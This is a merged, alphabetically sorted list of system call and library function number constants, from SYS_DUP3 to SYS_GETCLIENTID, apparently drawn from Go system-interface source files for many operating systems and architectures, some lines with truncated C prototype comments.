SYS_DUP3                         = 330
SYS_DUP3                         = 358
SYS_DUP3                         = 4327
SYS_DUP3                    = 24
SYS_DUP3                    = 292
SYS_DUP3                    = 316
SYS_DUP3                    = 320
SYS_DUP3                    = 326
SYS_DUP3                    = 5286
SYS_DUP3                 = 454 // { int
SYS_DYNALLOC                        = 0x0C3
SYS_DYNFREE                         = 0x0C2
SYS_EACCESS                  = 376 // { int eaccess(char 
SYS_EACCESS                = 532 // { int eaccess(char 
SYS_ECVT                            = 0x333
SYS_ENCRYPT                         = 0x2AD
SYS_ENDGRENT                        = 0x284
SYS_ENDHOSTENT                      = 0x339
SYS_ENDNETENT                       = 0x370
SYS_ENDPROTOENT                     = 0x33A
SYS_ENDPWENT                        = 0x287
SYS_ENDSERVENT                      = 0x33B
SYS_ENDUTXENT                       = 0x2E1
SYS_EPOLL_CREATE                 = 236
SYS_EPOLL_CREATE                 = 250
SYS_EPOLL_CREATE                 = 254
SYS_EPOLL_CREATE                 = 4248
SYS_EPOLL_CREATE            = 193
SYS_EPOLL_CREATE            = 213
SYS_EPOLL_CREATE            = 236
SYS_EPOLL_CREATE            = 249
SYS_EPOLL_CREATE            = 5207
SYS_EPOLL_CREATE1                = 315
SYS_EPOLL_CREATE1                = 329
SYS_EPOLL_CREATE1                = 357
SYS_EPOLL_CREATE1                = 4326
SYS_EPOLL_CREATE1           = 20
SYS_EPOLL_CREATE1           = 291
SYS_EPOLL_CREATE1           = 315
SYS_EPOLL_CREATE1           = 319
SYS_EPOLL_CREATE1           = 327
SYS_EPOLL_CREATE1           = 5285
SYS_EPOLL_CTL                    = 237
SYS_EPOLL_CTL                    = 251
SYS_EPOLL_CTL                    = 255
SYS_EPOLL_CTL                    = 4249
SYS_EPOLL_CTL               = 194
SYS_EPOLL_CTL               = 21
SYS_EPOLL_CTL               = 233
SYS_EPOLL_CTL               = 237
SYS_EPOLL_CTL               = 250
SYS_EPOLL_CTL               = 5208
SYS_EPOLL_CTL_OLD           = 214
SYS_EPOLL_PWAIT                  = 303
SYS_EPOLL_PWAIT                  = 319
SYS_EPOLL_PWAIT                  = 346
SYS_EPOLL_PWAIT                  = 4313
SYS_EPOLL_PWAIT             = 22
SYS_EPOLL_PWAIT             = 281
SYS_EPOLL_PWAIT             = 303
SYS_EPOLL_PWAIT             = 309
SYS_EPOLL_PWAIT             = 312
SYS_EPOLL_PWAIT             = 5272
SYS_EPOLL_PWAIT2                 = 441
SYS_EPOLL_PWAIT2                 = 4441
SYS_EPOLL_PWAIT2            = 441
SYS_EPOLL_PWAIT2            = 5441
SYS_EPOLL_WAIT                   = 238
SYS_EPOLL_WAIT                   = 252
SYS_EPOLL_WAIT                   = 256
SYS_EPOLL_WAIT                   = 4250
SYS_EPOLL_WAIT              = 195
SYS_EPOLL_WAIT              = 232
SYS_EPOLL_WAIT              = 238
SYS_EPOLL_WAIT              = 251
SYS_EPOLL_WAIT              = 5209
SYS_EPOLL_WAIT_OLD          = 215
SYS_ERAND48                         = 0x2B3
SYS_ERF                             = 0x02C
SYS_ERFC                            = 0x02D
SYS_ERFCD128                        = 0xBAA
SYS_ERFCD32                         = 0xBA8
SYS_ERFCD64                         = 0xBA9
SYS_ERFCF                           = 0x89B
SYS_ERFCL                           = 0x89C
SYS_ERFD128                         = 0xBA7
SYS_ERFD32                          = 0xBA5
SYS_ERFD64                          = 0xBA6
SYS_ERFF                            = 0x899
SYS_ERFL                            = 0x89A
SYS_ERRSTR      = 41
SYS_EVENTFD                      = 307
SYS_EVENTFD                      = 323
SYS_EVENTFD                      = 351
SYS_EVENTFD                      = 4319
SYS_EVENTFD                 = 284
SYS_EVENTFD                 = 307
SYS_EVENTFD                 = 313
SYS_EVENTFD                 = 318
SYS_EVENTFD                 = 5278
SYS_EVENTFD2                     = 314
SYS_EVENTFD2                     = 328
SYS_EVENTFD2                     = 356
SYS_EVENTFD2                     = 4325
SYS_EVENTFD2                = 19
SYS_EVENTFD2                = 290
SYS_EVENTFD2                = 314
SYS_EVENTFD2                = 318
SYS_EVENTFD2                = 323
SYS_EVENTFD2                = 5284
SYS_EXCHANGEDATA                   = 223
SYS_EXEC        = 7
SYS_EXECL                           = 0x184
SYS_EXECLE                          = 0x185
SYS_EXECLP                          = 0x186
SYS_EXECV                           = 0x187
SYS_EXECV                   = 11
SYS_EXECVE                          = 0x188
SYS_EXECVE                         = 59
SYS_EXECVE                       = 11
SYS_EXECVE                       = 4011
SYS_EXECVE                   = 59  // { int execve(char 
SYS_EXECVE                  = 11
SYS_EXECVE                  = 221
SYS_EXECVE                  = 5057
SYS_EXECVE                  = 59
SYS_EXECVE                 = 59  // { int execve(char 
SYS_EXECVE               = 59  // { int
SYS_EXECVE         = 59  // { int sys_execve(const char 
SYS_EXECVEAT                     = 358
SYS_EXECVEAT                     = 362
SYS_EXECVEAT                     = 387
SYS_EXECVEAT                     = 4356
SYS_EXECVEAT                = 281
SYS_EXECVEAT                = 322
SYS_EXECVEAT                = 350
SYS_EXECVEAT                = 354
SYS_EXECVEAT                = 362
SYS_EXECVEAT                = 5316
SYS_EXECVP                          = 0x189
SYS_EXEC_SYS_REGISTER      = 465 // { int exec_sys_register(void 
SYS_EXEC_SYS_UNREGISTER    = 466 // { int exec_sys_unregister(int id)
SYS_EXIT                            = 0x05A
SYS_EXIT                           = 1
SYS_EXIT                         = 1
SYS_EXIT                         = 4001
SYS_EXIT                     = 1   // { void sys_exit(int rval)
SYS_EXIT                    = 1
SYS_EXIT                    = 5058
SYS_EXIT                    = 60
SYS_EXIT                    = 93
SYS_EXIT                 = 1   // { void
SYS_EXIT           = 1   // { void sys_exit(int rval)
SYS_EXIT  = 1 // { void exit(int rval)
SYS_EXITS       = 8
SYS_EXIT_GROUP                   = 234
SYS_EXIT_GROUP                   = 248
SYS_EXIT_GROUP                   = 252
SYS_EXIT_GROUP                   = 4246
SYS_EXIT_GROUP              = 188
SYS_EXIT_GROUP              = 231
SYS_EXIT_GROUP              = 234
SYS_EXIT_GROUP              = 248
SYS_EXIT_GROUP              = 5205
SYS_EXIT_GROUP              = 94
SYS_EXP                             = 0x01A
SYS_EXP2                            = 0x89E
SYS_EXP2D128                        = 0xBB0
SYS_EXP2D32                         = 0xBAE
SYS_EXP2D64                         = 0xBAF
SYS_EXP2F                           = 0x87B
SYS_EXP2L                           = 0x87C
SYS_EXPD128                         = 0xBAD
SYS_EXPD32                          = 0xBAB
SYS_EXPD64                          = 0xBAC
SYS_EXPF                            = 0x641
SYS_EXPL                            = 0x642
SYS_EXPM1                           = 0x324
SYS_EXPM1D128                       = 0xBB3
SYS_EXPM1D32                        = 0xBB1
SYS_EXPM1D64                        = 0xBB2
SYS_EXPM1F                          = 0x87D
SYS_EXPM1L                          = 0x87E
SYS_EXPORTWO                        = 0x5A1
SYS_EXPORTWORKUNIT                  = 0x5A1
SYS_EXTATTRCTL               = 355 // { int extattrctl(const char 
SYS_EXTATTRCTL             = 355 // { int extattrctl(const char 
SYS_EXTATTRCTL           = 360 // { int
SYS_EXTATTR_DELETE_FD    = 366 // { int
SYS_EXTATTR_DELETE_FILE      = 358 // { int extattr_delete_file(const char 
SYS_EXTATTR_DELETE_FILE    = 358 // { int extattr_delete_file(const char 
SYS_EXTATTR_DELETE_FILE  = 363 // { int
SYS_EXTATTR_DELETE_LINK      = 414 // { int extattr_delete_link( const char 
SYS_EXTATTR_DELETE_LINK  = 369 // { int
SYS_EXTATTR_GET_FD       = 365 // { ssize_t
SYS_EXTATTR_GET_FILE         = 357 // { ssize_t extattr_get_file( const char 
SYS_EXTATTR_GET_FILE       = 357 // { int extattr_get_file(const char 
SYS_EXTATTR_GET_FILE     = 362 // { ssize_t
SYS_EXTATTR_GET_LINK         = 413 // { ssize_t extattr_get_link( const char 
SYS_EXTATTR_GET_LINK     = 368 // { ssize_t
SYS_EXTATTR_LIST_FD      = 370 // { ssize_t
SYS_EXTATTR_LIST_FILE        = 438 // { ssize_t extattr_list_file( const char 
SYS_EXTATTR_LIST_FILE    = 371 // { ssize_t
SYS_EXTATTR_LIST_LINK        = 439 // { ssize_t extattr_list_link( const char 
SYS_EXTATTR_LIST_LINK    = 372 // { ssize_t
SYS_EXTATTR_SET_FD       = 364 // { int
SYS_EXTATTR_SET_FILE         = 356 // { ssize_t extattr_set_file( const char 
SYS_EXTATTR_SET_FILE       = 356 // { int extattr_set_file(const char 
SYS_EXTATTR_SET_FILE     = 361 // { int
SYS_EXTATTR_SET_LINK         = 412 // { ssize_t extattr_set_link( const char 
SYS_EXTATTR_SET_LINK     = 367 // { int
SYS_EXTLINK_NP                      = 0x215
SYS_EXTRACTW                        = 0x5A5
SYS_EXTRACTWORKUNIT                 = 0x5A5
SYS_FABS                            = 0x024
SYS_FABSD128                        = 0xBB6
SYS_FABSD32                         = 0xBB4
SYS_FABSD64                         = 0xBB5
SYS_FABSF                           = 0x653
SYS_FABSL                           = 0x654
SYS_FACCESSAT                      = 466
SYS_FACCESSAT                    = 298
SYS_FACCESSAT                    = 307
SYS_FACCESSAT                    = 334
SYS_FACCESSAT                    = 4300
SYS_FACCESSAT               = 269
SYS_FACCESSAT               = 296
SYS_FACCESSAT               = 298
SYS_FACCESSAT               = 300
SYS_FACCESSAT               = 48
SYS_FACCESSAT               = 5259
SYS_FACCESSAT            = 462 // { int
SYS_FACCESSAT2                   = 439
SYS_FACCESSAT2                   = 4439
SYS_FACCESSAT2              = 439
SYS_FACCESSAT2              = 5439
SYS_FADVISE64                    = 233
SYS_FADVISE64                    = 250
SYS_FADVISE64                    = 4254
SYS_FADVISE64               = 209
SYS_FADVISE64               = 221
SYS_FADVISE64               = 223
SYS_FADVISE64               = 233
SYS_FADVISE64               = 253
SYS_FADVISE64               = 5215
SYS_FADVISE64_64                 = 254
SYS_FADVISE64_64                 = 272
SYS_FADVISE64_64            = 210
SYS_FALLOCATE                    = 309
SYS_FALLOCATE                    = 324
SYS_FALLOCATE                    = 352
SYS_FALLOCATE                    = 4320
SYS_FALLOCATE               = 285
SYS_FALLOCATE               = 309
SYS_FALLOCATE               = 314
SYS_FALLOCATE               = 47
SYS_FALLOCATE               = 5279
SYS_FANOTIFY_INIT                = 323
SYS_FANOTIFY_INIT                = 338
SYS_FANOTIFY_INIT                = 367
SYS_FANOTIFY_INIT                = 4336
SYS_FANOTIFY_INIT           = 262
SYS_FANOTIFY_INIT           = 300
SYS_FANOTIFY_INIT           = 323
SYS_FANOTIFY_INIT           = 329
SYS_FANOTIFY_INIT           = 332
SYS_FANOTIFY_INIT           = 5295
SYS_FANOTIFY_MARK                = 324
SYS_FANOTIFY_MARK                = 339
SYS_FANOTIFY_MARK                = 368
SYS_FANOTIFY_MARK                = 4337
SYS_FANOTIFY_MARK           = 263
SYS_FANOTIFY_MARK           = 301
SYS_FANOTIFY_MARK           = 324
SYS_FANOTIFY_MARK           = 330
SYS_FANOTIFY_MARK           = 333
SYS_FANOTIFY_MARK           = 5296
SYS_FATTACH                         = 0x427
SYS_FAUTH       = 10
SYS_FCHAUDIT                        = 0x1E1
SYS_FCHDIR                          = 0x2D9
SYS_FCHDIR                         = 13
SYS_FCHDIR                       = 133
SYS_FCHDIR                       = 4133
SYS_FCHDIR                   = 13  // { int fchdir(int fd)
SYS_FCHDIR                  = 133
SYS_FCHDIR                  = 176
SYS_FCHDIR                  = 50
SYS_FCHDIR                  = 5079
SYS_FCHDIR                  = 81
SYS_FCHDIR                 = 13  // { int fchdir(int fd)
SYS_FCHDIR               = 13  // { int
SYS_FCHDIR         = 13  // { int sys_fchdir(int fd)
SYS_FCHFLAGS                       = 35
SYS_FCHFLAGS             = 35  // { int
SYS_FCHMOD                          = 0x18A
SYS_FCHMOD                         = 124
SYS_FCHMOD                       = 4094
SYS_FCHMOD                       = 94
SYS_FCHMOD                  = 124
SYS_FCHMOD                  = 5089
SYS_FCHMOD                  = 52
SYS_FCHMOD                  = 91
SYS_FCHMOD                  = 94
SYS_FCHMOD               = 124 // { int
SYS_FCHMODAT                       = 467
SYS_FCHMODAT                     = 297
SYS_FCHMODAT                     = 306
SYS_FCHMODAT                     = 333
SYS_FCHMODAT                     = 4299
SYS_FCHMODAT                = 268
SYS_FCHMODAT                = 295
SYS_FCHMODAT                = 297
SYS_FCHMODAT                = 299
SYS_FCHMODAT                = 5258
SYS_FCHMODAT                = 53
SYS_FCHMODAT             = 463 // { int
SYS_FCHMOD_EXTENDED                = 283
SYS_FCHOWN                          = 0x18B
SYS_FCHOWN                         = 123
SYS_FCHOWN                       = 4095
SYS_FCHOWN                       = 95
SYS_FCHOWN                  = 123
SYS_FCHOWN                  = 207
SYS_FCHOWN                  = 5091
SYS_FCHOWN                  = 55
SYS_FCHOWN                  = 93
SYS_FCHOWN                  = 95
SYS_FCHOWN               = 123 // { int
SYS_FCHOWN32                     = 207
SYS_FCHOWNAT                       = 468
SYS_FCHOWNAT                     = 289
SYS_FCHOWNAT                     = 298
SYS_FCHOWNAT                     = 325
SYS_FCHOWNAT                     = 4291
SYS_FCHOWNAT                = 260
SYS_FCHOWNAT                = 287
SYS_FCHOWNAT                = 289
SYS_FCHOWNAT                = 291
SYS_FCHOWNAT                = 5250
SYS_FCHOWNAT                = 54
SYS_FCHOWNAT             = 464 // { int
SYS_FCHROOT              = 297 // { int
SYS_FCLONEFILEAT                   = 517
SYS_FCLOSE                          = 0x067
SYS_FCNTL                           = 0x18C
SYS_FCNTL                          = 92
SYS_FCNTL                        = 4055
SYS_FCNTL                        = 55
SYS_FCNTL                   = 25
SYS_FCNTL                   = 5070
SYS_FCNTL                   = 55
SYS_FCNTL                   = 72
SYS_FCNTL                   = 92
SYS_FCNTL                = 92  // { int
SYS_FCNTL64                      = 204
SYS_FCNTL64                      = 221
SYS_FCNTL64                      = 4220
SYS_FCNTL_NOCANCEL                 = 406
SYS_FCVT                            = 0x334
SYS_FD2PATH     = 23
SYS_FDATASYNC                      = 187
SYS_FDATASYNC                    = 148
SYS_FDATASYNC                    = 4152
SYS_FDATASYNC                = 550 // { int fdatasync(int fd)
SYS_FDATASYNC               = 148
SYS_FDATASYNC               = 253
SYS_FDATASYNC               = 5073
SYS_FDATASYNC               = 75
SYS_FDATASYNC               = 83
SYS_FDATASYNC            = 241 // { int
SYS_FDELREC                         = 0x247
SYS_FDELREC_UNLOCKED                = 0xCA2
SYS_FDETACH                         = 0x428
SYS_FDIM                            = 0x881
SYS_FDIMD128                        = 0xBB9
SYS_FDIMD32                         = 0xBB7
SYS_FDIMD64                         = 0xBB8
SYS_FDIMF                           = 0x87F
SYS_FDIML                           = 0x882
SYS_FDOPEN                          = 0x155
SYS_FDOPEN_UNLOCKED                 = 0xCFC
SYS_FECLEAREXCEPT                   = 0xAEA
SYS_FEGETENV                        = 0xAEB
SYS_FEGETEXCEPTFLAG                 = 0xAEC
SYS_FEGETROUND                      = 0xAED
SYS_FEHOLDEXCEPT                    = 0xAEE
SYS_FEOF                            = 0x04D
SYS_FEOF_UNLOCKED                   = 0xCA3
SYS_FERAISEEXCEPT                   = 0xAEF
SYS_FERROR                          = 0x04A
SYS_FERROR_UNLOCKED                 = 0xCA4
SYS_FESETENV                        = 0xAF0
SYS_FESETEXCEPTFLAG                 = 0xAF1
SYS_FESETROUND                      = 0xAF2
SYS_FETCH                           = 0x248
SYS_FETCHEP                         = 0x0BF
SYS_FETESTEXCEPT                    = 0xAF3
SYS_FEUPDATEENV                     = 0xAF4
SYS_FEXECVE              = 465 // { int
SYS_FE_DEC_GETROUND                 = 0xBBA
SYS_FE_DEC_SETROUND                 = 0xBBB
SYS_FFCLOCK_GETCOUNTER       = 241 // { int ffclock_getcounter(ffcounter 
SYS_FFCLOCK_GETESTIMATE      = 243 // { int ffclock_getestimate( struct ffclock_estimate 
SYS_FFCLOCK_SETESTIMATE      = 242 // { int ffclock_setestimate( struct ffclock_estimate 
SYS_FFLUSH                          = 0x068
SYS_FFLUSH_UNLOCKED                 = 0xCA5
SYS_FFS                             = 0x2BC
SYS_FFSCTL                         = 245
SYS_FGETATTRLIST                   = 228
SYS_FGETC                           = 0x072
SYS_FGETC_UNLOCKED                  = 0xC80
SYS_FGETPOS                         = 0x047
SYS_FGETPOS64                       = 0xCEE
SYS_FGETPOS64_UNLOCKED              = 0xCF4
SYS_FGETPOS_UNLOCKED                = 0xCA6
SYS_FGETS                           = 0x077
SYS_FGETS_UNLOCKED                  = 0xC7C
SYS_FGETWC                          = 0x13C
SYS_FGETWC_UNLOCKED                 = 0xCA7
SYS_FGETWS                          = 0x13D
SYS_FGETWS_UNLOCKED                 = 0xCA8
SYS_FGETXATTR                      = 235
SYS_FGETXATTR                    = 214
SYS_FGETXATTR                    = 231
SYS_FGETXATTR                    = 4229
SYS_FGETXATTR               = 10
SYS_FGETXATTR               = 177
SYS_FGETXATTR               = 193
SYS_FGETXATTR               = 214
SYS_FGETXATTR               = 229
SYS_FGETXATTR               = 5185
SYS_FGETXATTR            = 380 // { int
SYS_FHOPEN                         = 248
SYS_FHOPEN                   = 298 // { int fhopen(const struct fhandle 
SYS_FHOPEN                 = 298 // { int fhopen(const struct fhandle 
SYS_FHOPEN         = 264 // { int sys_fhopen(const fhandle_t 
SYS_FHSTAT                   = 299 // { int fhstat(const struct fhandle 
SYS_FHSTAT                 = 478 // { int fhstat(const struct fhandle 
SYS_FHSTAT               = 451 // { int
SYS_FHSTAT         = 294 // { int sys_fhstat(const fhandle_t 
SYS_FHSTATFS                 = 398 // { int fhstatfs(const struct fhandle 
SYS_FHSTATFS               = 297 // { int fhstatfs(const struct fhandle 
SYS_FHSTATFS       = 65  // { int sys_fhstatfs(const fhandle_t 
SYS_FHSTATVFS              = 502 // { int fhstatvfs(const struct fhandle 
SYS_FILENO                          = 0x18D
SYS_FILENO_UNLOCKED                 = 0xCA9
SYS_FILEPORT_MAKEFD                = 431
SYS_FILEPORT_MAKEPORT              = 430
SYS_FINITE                          = 0x4C8
SYS_FINIT_MODULE                 = 350
SYS_FINIT_MODULE                 = 353
SYS_FINIT_MODULE                 = 379
SYS_FINIT_MODULE                 = 4348
SYS_FINIT_MODULE            = 273
SYS_FINIT_MODULE            = 313
SYS_FINIT_MODULE            = 342
SYS_FINIT_MODULE            = 344
SYS_FINIT_MODULE            = 353
SYS_FINIT_MODULE            = 5307
SYS_FKTRACE              = 288 // { int
SYS_FLDATA                          = 0x0C1
SYS_FLDATA_UNLOCKED                 = 0xCAA
SYS_FLISTXATTR                     = 241
SYS_FLISTXATTR                   = 217
SYS_FLISTXATTR                   = 234
SYS_FLISTXATTR                   = 4232
SYS_FLISTXATTR              = 13
SYS_FLISTXATTR              = 180
SYS_FLISTXATTR              = 196
SYS_FLISTXATTR              = 217
SYS_FLISTXATTR              = 232
SYS_FLISTXATTR              = 5188
SYS_FLISTXATTR           = 383 // { int
SYS_FLOCATE                         = 0x246
SYS_FLOCATE_UNLOCKED                = 0xCAB
SYS_FLOCK                          = 131
SYS_FLOCK                        = 143
SYS_FLOCK                        = 4143
SYS_FLOCK                   = 131
SYS_FLOCK                   = 143
SYS_FLOCK                   = 32
SYS_FLOCK                   = 5071
SYS_FLOCK                   = 73
SYS_FLOCK                = 131 // { int
SYS_FLOCKFILE                       = 0x8D3
SYS_FLOOR                           = 0x022
SYS_FLOORD128                       = 0xBBE
SYS_FLOORD32                        = 0xBBC
SYS_FLOORD64                        = 0xBBD
SYS_FLOORF                          = 0x655
SYS_FLOORL                          = 0x656
SYS_FMA                             = 0xA63
SYS_FMAD128                         = 0xBC1
SYS_FMAD32                          = 0xBBF
SYS_FMAD64                          = 0xBC0
SYS_FMAF                            = 0xA66
SYS_FMAL                            = 0xA69
SYS_FMAX                            = 0xA6C
SYS_FMAXD128                        = 0xBC4
SYS_FMAXD32                         = 0xBC2
SYS_FMAXD64                         = 0xBC3
SYS_FMAXF                           = 0xA6F
SYS_FMAXL                           = 0xA72
SYS_FMIN                            = 0xA75
SYS_FMIND128                        = 0xBC7
SYS_FMIND32                         = 0xBC5
SYS_FMIND64                         = 0xBC6
SYS_FMINF                           = 0xA78
SYS_FMINL                           = 0xA7B
SYS_FMOD                            = 0x025
SYS_FMODD128                        = 0xBCA
SYS_FMODD32                         = 0xBC8
SYS_FMODD64                         = 0xBC9
SYS_FMODF                           = 0x657
SYS_FMODL                           = 0x658
SYS_FMOUNT                         = 526
SYS_FMTMSG                          = 0x2E5
SYS_FNMATCH                         = 0x317
SYS_FOPEN                           = 0x069
SYS_FOPEN64                         = 0xD49
SYS_FOPEN64_UNLOCKED                = 0xD4A
SYS_FOPEN_UNLOCKED                  = 0xCFA
SYS_FORK                            = 0x18E
SYS_FORK                           = 2
SYS_FORK                         = 2
SYS_FORK                         = 4002
SYS_FORK                     = 2   // { int fork(void)
SYS_FORK                    = 2
SYS_FORK                    = 5056
SYS_FORK                    = 57
SYS_FORK                 = 2   // { int
SYS_FORK           = 2   // { int sys_fork(void)
SYS_FORK  = 2 // { int fork(void)
SYS_FPATHCONF                       = 0x18F
SYS_FPATHCONF                      = 192
SYS_FPATHCONF            = 192 // { long
SYS_FPRINTF                         = 0x06D
SYS_FPRINTF_UNLOCKED                = 0xCAC
SYS_FPUTC                           = 0x078
SYS_FPUTC_UNLOCKED                  = 0xC81
SYS_FPUTS                           = 0x079
SYS_FPUTS_UNLOCKED                  = 0xC7E
SYS_FPUTWC                          = 0x13E
SYS_FPUTWC_UNLOCKED                 = 0xCAD
SYS_FPUTWS                          = 0x13F
SYS_FPUTWS_UNLOCKED                 = 0xCAE
SYS_FREAD                           = 0x081
SYS_FREAD_NOUPDATE                  = 0xCEC
SYS_FREAD_NOUPDATE_UNLOCKED         = 0xCED
SYS_FREAD_UNLOCKED                  = 0xC7B
SYS_FREE                            = 0x059
SYS_FREEADDRINFO                    = 0x81A
SYS_FREEIFADDRS                     = 0xCE6
SYS_FREMOVEXATTR                   = 239
SYS_FREMOVEXATTR                 = 220
SYS_FREMOVEXATTR                 = 237
SYS_FREMOVEXATTR                 = 4235
SYS_FREMOVEXATTR            = 16
SYS_FREMOVEXATTR            = 186
SYS_FREMOVEXATTR            = 199
SYS_FREMOVEXATTR            = 220
SYS_FREMOVEXATTR            = 235
SYS_FREMOVEXATTR            = 5191
SYS_FREMOVEXATTR         = 386 // { int
SYS_FREOPEN                         = 0x066
SYS_FREOPEN64                       = 0xD4B
SYS_FREOPEN64_UNLOCKED              = 0xD4C
SYS_FREOPEN_UNLOCKED                = 0xCFB
SYS_FREXP                           = 0x01D
SYS_FREXPD128                       = 0xBCE
SYS_FREXPD32                        = 0xBCC
SYS_FREXPD64                        = 0xBCD
SYS_FREXPF                          = 0x659
SYS_FREXPL                          = 0x65A
SYS_FSCANF                          = 0x06A
SYS_FSCANF_UNLOCKED                 = 0xCAF
SYS_FSCONFIG                     = 431
SYS_FSCONFIG                     = 4431
SYS_FSCONFIG                = 431
SYS_FSCONFIG                = 5431
SYS_FSCTL                          = 242
SYS_FSEEK                           = 0x048
SYS_FSEEK64                         = 0xCEF
SYS_FSEEK64_UNLOCKED                = 0xCF5
SYS_FSEEKO                          = 0x5C9
SYS_FSEEKO64                        = 0xCF0
SYS_FSEEKO64_UNLOCKED               = 0xCF6
SYS_FSEEKO_UNLOCKED                 = 0xCB1
SYS_FSEEK_UNLOCKED                  = 0xCB0
SYS_FSETATTRLIST                   = 229
SYS_FSETPOS                         = 0x049
SYS_FSETPOS64                       = 0xCF1
SYS_FSETPOS64_UNLOCKED              = 0xCF7
SYS_FSETPOS_UNLOCKED                = 0xCB3
SYS_FSETXATTR                      = 237
SYS_FSETXATTR                    = 211
SYS_FSETXATTR                    = 228
SYS_FSETXATTR                    = 4226
SYS_FSETXATTR               = 171
SYS_FSETXATTR               = 190
SYS_FSETXATTR               = 211
SYS_FSETXATTR               = 226
SYS_FSETXATTR               = 5182
SYS_FSETXATTR               = 7
SYS_FSETXATTR            = 377 // { int
SYS_FSGETPATH                      = 427
SYS_FSMOUNT                      = 432
SYS_FSMOUNT                      = 4432
SYS_FSMOUNT                 = 432
SYS_FSMOUNT                 = 5432
SYS_FSOPEN                       = 430
SYS_FSOPEN                       = 4430
SYS_FSOPEN                  = 430
SYS_FSOPEN                  = 5430
SYS_FSPICK                       = 433
SYS_FSPICK                       = 4433
SYS_FSPICK                  = 433
SYS_FSPICK                  = 5433
SYS_FSTAT                           = 0x190
SYS_FSTAT                          = 189
SYS_FSTAT                        = 108
SYS_FSTAT                        = 4108
SYS_FSTAT                   = 108
SYS_FSTAT                   = 5
SYS_FSTAT                   = 5005
SYS_FSTAT                   = 62
SYS_FSTAT                   = 80
SYS_FSTAT                = 440 // { int
SYS_FSTAT       = 43
SYS_FSTAT64                        = 339
SYS_FSTAT64                      = 197
SYS_FSTAT64                      = 4215
SYS_FSTAT64                 = 63
SYS_FSTAT64_EXTENDED               = 343
SYS_FSTATAT                        = 469
SYS_FSTATAT                 = 79
SYS_FSTATAT              = 466 // { int
SYS_FSTATAT64                      = 470
SYS_FSTATAT64                    = 291
SYS_FSTATAT64                    = 300
SYS_FSTATAT64                    = 327
SYS_FSTATAT64                    = 4293
SYS_FSTATAT64               = 289
SYS_FSTATFS                        = 158
SYS_FSTATFS                      = 100
SYS_FSTATFS                      = 4100
SYS_FSTATFS                 = 100
SYS_FSTATFS                 = 138
SYS_FSTATFS                 = 158
SYS_FSTATFS                 = 44
SYS_FSTATFS                 = 5135
SYS_FSTATFS64                      = 346
SYS_FSTATFS64                    = 253
SYS_FSTATFS64                    = 267
SYS_FSTATFS64                    = 269
SYS_FSTATFS64                    = 4256
SYS_FSTATFS64               = 235
SYS_FSTATFS64               = 253
SYS_FSTATFS64               = 266
SYS_FSTATVFS                        = 0x2B4
SYS_FSTATVFS1            = 358 // { int
SYS_FSTAT_EXTENDED                 = 281
SYS_FSYNC                           = 0x191
SYS_FSYNC                          = 95
SYS_FSYNC                        = 118
SYS_FSYNC                        = 4118
SYS_FSYNC                    = 95  // { int fsync(int fd)
SYS_FSYNC                   = 118
SYS_FSYNC                   = 5072
SYS_FSYNC                   = 74
SYS_FSYNC                   = 82
SYS_FSYNC                   = 95
SYS_FSYNC                  = 95  // { int fsync(int fd)
SYS_FSYNC                = 95  // { int
SYS_FSYNC          = 95  // { int sys_fsync(int fd)
SYS_FSYNC_NOCANCEL                 = 408
SYS_FSYNC_RANGE          = 354 // { int
SYS_FS_SNAPSHOT                    = 518
SYS_FTELL                           = 0x046
SYS_FTELL64                         = 0xCF2
SYS_FTELL64_UNLOCKED                = 0xCF8
SYS_FTELLO                          = 0x5C8
SYS_FTELLO64                        = 0xCF3
SYS_FTELLO64_UNLOCKED               = 0xCF9
SYS_FTELLO_UNLOCKED                 = 0xCB5
SYS_FTELL_UNLOCKED                  = 0xCB4
SYS_FTIME                           = 0x2F5
SYS_FTIME                        = 35
SYS_FTIME                        = 4035
SYS_FTIME                   = 35
SYS_FTOK                            = 0x301
SYS_FTRUNCATE                       = 0x192
SYS_FTRUNCATE                      = 201
SYS_FTRUNCATE                    = 4093
SYS_FTRUNCATE                    = 93
SYS_FTRUNCATE               = 130
SYS_FTRUNCATE               = 46
SYS_FTRUNCATE               = 5075
SYS_FTRUNCATE               = 77
SYS_FTRUNCATE               = 93
SYS_FTRUNCATE            = 201 // { int
SYS_FTRUNCATE64                  = 194
SYS_FTRUNCATE64                  = 4212
SYS_FTRYLOCKFILE                    = 0x8D4
SYS_FTW                             = 0x318
SYS_FUNLOCKFILE                     = 0x8D5
SYS_FUPDATE                         = 0x0B5
SYS_FUPDATE_UNLOCKED                = 0xCB7
SYS_FUTEX                        = 221
SYS_FUTEX                        = 240
SYS_FUTEX                        = 4238
SYS_FUTEX                   = 142
SYS_FUTEX                   = 202
SYS_FUTEX                   = 221
SYS_FUTEX                   = 238
SYS_FUTEX                   = 5194
SYS_FUTEX                   = 98
SYS_FUTEX          = 83  // { int sys_futex(uint32_t 
SYS_FUTEX_TIME64                 = 422
SYS_FUTEX_TIME64                 = 4422
SYS_FUTEX_WAITV                  = 4449
SYS_FUTEX_WAITV                  = 449
SYS_FUTEX_WAITV             = 449
SYS_FUTEX_WAITV             = 5449
SYS_FUTIMENS             = 472 // { int
SYS_FUTIMES                        = 139
SYS_FUTIMES              = 423 // { int
SYS_FUTIMESAT                    = 290
SYS_FUTIMESAT                    = 299
SYS_FUTIMESAT                    = 326
SYS_FUTIMESAT                    = 4292
SYS_FUTIMESAT               = 261
SYS_FUTIMESAT               = 288
SYS_FUTIMESAT               = 290
SYS_FUTIMESAT               = 292
SYS_FUTIMESAT               = 5251
SYS_FVERSION    = 40
SYS_FWIDE                           = 0x7DF
SYS_FWIDE_UNLOCKED                  = 0xCB8
SYS_FWPRINTF                        = 0x7D1
SYS_FWPRINTF_UNLOCKED               = 0xCB9
SYS_FWRITE                          = 0x07E
SYS_FWRITE_UNLOCKED                 = 0xC7A
SYS_FWSCANF                         = 0x7D5
SYS_FWSCANF_UNLOCKED                = 0xCBA
SYS_FWSTAT      = 45
SYS_GAI_STRERROR                    = 0x81B
SYS_GAMMA                           = 0x02E
SYS_GAMMA_R                         = 0x4E2
SYS_GCVT                            = 0x335
SYS_GETADDRINFO                     = 0x818
SYS_GETATTRLIST                    = 220
SYS_GETATTRLISTAT                  = 476
SYS_GETATTRLISTBULK                = 461
SYS_GETAUDIT                 = 449 // { int getaudit(struct auditinfo 
SYS_GETAUDIT_ADDR                  = 357
SYS_GETAUDIT_ADDR            = 451 // { int getaudit_addr( struct auditinfo_addr 
SYS_GETAUID                        = 353
SYS_GETAUID                  = 447 // { int getauid(uid_t 
SYS_GETC                            = 0x076
SYS_GETCHAR                         = 0x07B
SYS_GETCHAR_UNLOCKED                = 0x8D7
SYS_GETCLIENTID                     = 0x470
